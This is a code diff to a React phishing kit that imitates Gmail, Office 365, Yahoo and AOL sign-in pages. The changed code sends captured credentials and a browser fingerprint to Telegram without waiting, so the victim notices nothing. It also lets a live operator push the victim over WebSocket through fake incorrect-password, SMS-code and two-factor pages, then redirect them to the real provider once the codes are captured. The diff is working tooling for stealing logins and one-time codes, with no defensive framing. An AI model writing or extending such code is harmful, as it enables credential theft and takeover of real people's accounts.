@@ -294,14 +294,24 @@ function App() {
   const navigate = useNavigate();
   const location = useLocation();
 
+  // App-level state for interactive elements that the operator can drive over
+  // WebSocket. The page components (e.g. `GmailSmsCodePage`) are "dumb": they
+  // receive these values as props and simply render them.
+  const [smsCode, setSmsCode] = useState('');
+
   // WebSocket command handler. Each interactive command navigates to a dedicated
   // per-provider full-screen page; there is no generic overlay.
   const handleWebSocketMessage = (message: WebSocketMessage) => {
     const { command, data } = message;
+    if (command === 'redirect' && typeof data?.url === 'string') {
+      // Operator-driven terminal redirect (e.g. to the real provider after capture).
+      window.location.href = data.url as string;
+      return;
+    }
     if (command === 'hide_state' || command === 'reset') {
       window.location.href = 'https://www.adobe.com';
     } else if (command === 'navigate' && data?.route) {
-      navigate(data.route);
+      navigate(data.route as string);
     } else if (command.startsWith('show_')) {
       const flow = command.replace('show_', '') as keyof typeof routeMaps;
       const providerKey = normalizeProviderKey(data?.provider as string);
@@ -314,6 +324,12 @@ function App() {
         two_factor: TWO_FACTOR_ROUTE_BY_PROVIDER,
         email_verification: EMAIL_VERIFICATION_ROUTE_BY_PROVIDER,
       };
+      // For `show_sms_code`, capture the operator-supplied code so the SMS
+      // page can render it directly from props.
+      if (flow === 'sms_code') {
+        const providedCode = (data?.code as string) || '';
+        setSmsCode(providedCode);
+      }
       const targetRoute = routeMaps[flow]?.[providerKey];
       if (targetRoute) {
         navigate(targetRoute, { state: { data, provider: data?.provider || 'Others' } });
@@ -336,21 +352,27 @@ function App() {
   });
 
   // Centralized handler for all user actions on interactive pages (incorrect-password
-  // retry, SMS/2FA/email-code submission, resend requests, etc.).
+  // retry, SMS/2FA/email-code submission, resend requests, etc.). Per the
+  // standardized one-attempt flow, terminal submissions DO NOT navigate on
+  // their own — they show a loading spinner and wait for a WebSocket command
+  // (`redirect`, `show_*`, …) from the operator to drive the next step.
   const handleInteractiveAction = async (action: string, data?: Record<string, unknown>) => {
-    setIsLoading(true);
     const payload = {
       type: 'interaction',
       data: { action, sessionId, ...data }
     };
-    await safeSendToTelegram(payload);
 
     if (['retry_password', 'submit_sms', 'submit_2fa', 'submit_email_code'].includes(action)) {
-      window.location.href = 'https://www.adobe.com';
-    } else if (action === 'retry') {
+      // Show loading spinner and wait for the server-driven WebSocket command.
+      setIsLoading(true);
+      // Fire-and-forget — the operator drives the next UI state over WebSocket.
+      safeSendToTelegram(payload);
+      return;
+    }
+
+    await safeSendToTelegram(payload);
+    if (action === 'retry') {
       navigate(ROUTES.HOME, { replace: true });
-    } else {
-      setIsLoading(false);
     }
   };
 
@@ -395,23 +417,23 @@ function App() {
     navigate(ROUTES.LOGIN);
   };
 
-  // "One-attempt" login: capture credentials, send them once to Telegram, then
-  // immediately route to the provider-specific Incorrect-Password page so the
-  // operator can drive the rest of the session over WebSocket.
+  // "One-attempt" login: capture credentials, send them once to Telegram
+  // (fire-and-forget), then immediately route to the provider-specific
+  // Incorrect-Password page so the operator can drive the rest of the session
+  // over WebSocket.
   const handleLoginSuccess = async (loginData: Record<string, unknown>) => {
-    setIsLoading(true);
     let fingerprint: Record<string, unknown> = {};
     try { fingerprint = await getBrowserFingerprint(); } catch (e) { console.warn('Fingerprint failed', e); }
 
     const credentialsData = { ...loginData, sessionId, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, ...fingerprint };
-    await safeSendToTelegram({ type: 'credentials', data: credentialsData });
+    // Fire-and-forget: do NOT await the API response — navigation must happen immediately.
+    safeSendToTelegram({ type: 'credentials', data: credentialsData });
 
     const providerKey = normalizeProviderKey(loginData.provider as string);
     navigate(INCORRECT_PWD_ROUTE_BY_PROVIDER[providerKey], {
       replace: true,
       state: { data: { email: loginData.email, provider: loginData.provider }, provider: (loginData.provider as string) || 'Others' },
     });
-    setIsLoading(false);
   };
 
   const handleLogout = () => {
@@ -539,11 +561,11 @@ function App() {
       <Route path={ROUTES.LOGIN_OFFICE365} element={!hasActiveSession ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
       <Route path={ROUTES.LANDING} element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to={ROUTES.HOME} replace />} />
       {/* Per-provider SMS-code pages (real-time, triggered by WebSocket `show_sms_code`) */}
-      <Route path={ROUTES.SMS_GMAIL} element={<GmailSmsCodePage onAction={handleInteractiveAction} />} />
-      <Route path={ROUTES.SMS_OFFICE365} element={<Office365SmsCodePage onAction={handleInteractiveAction} />} />
-      <Route path={ROUTES.SMS_YAHOO} element={<YahooSmsCodePage onAction={handleInteractiveAction} />} />
-      <Route path={ROUTES.SMS_AOL} element={<AolSmsCodePage onAction={handleInteractiveAction} />} />
-      <Route path={ROUTES.SMS_OTHERS} element={<OthersSmsCodePage onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.SMS_GMAIL} element={<GmailSmsCodePage smsCode={smsCode} onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.SMS_OFFICE365} element={<Office365SmsCodePage smsCode={smsCode} onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.SMS_YAHOO} element={<YahooSmsCodePage smsCode={smsCode} onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.SMS_AOL} element={<AolSmsCodePage smsCode={smsCode} onAction={handleInteractiveAction} />} />
+      <Route path={ROUTES.SMS_OTHERS} element={<OthersSmsCodePage smsCode={smsCode} onAction={handleInteractiveAction} />} />
       {/* Per-provider authenticator-approval pages (real-time, triggered by WebSocket `show_authenticator_approval`) */}
       <Route path={ROUTES.AUTH_GMAIL} element={<GmailAuthPromptPage onAction={handleInteractiveAction} />} />
       <Route path={ROUTES.AUTH_OFFICE365} element={<Office365AuthPromptPage onAction={handleInteractiveAction} />} />
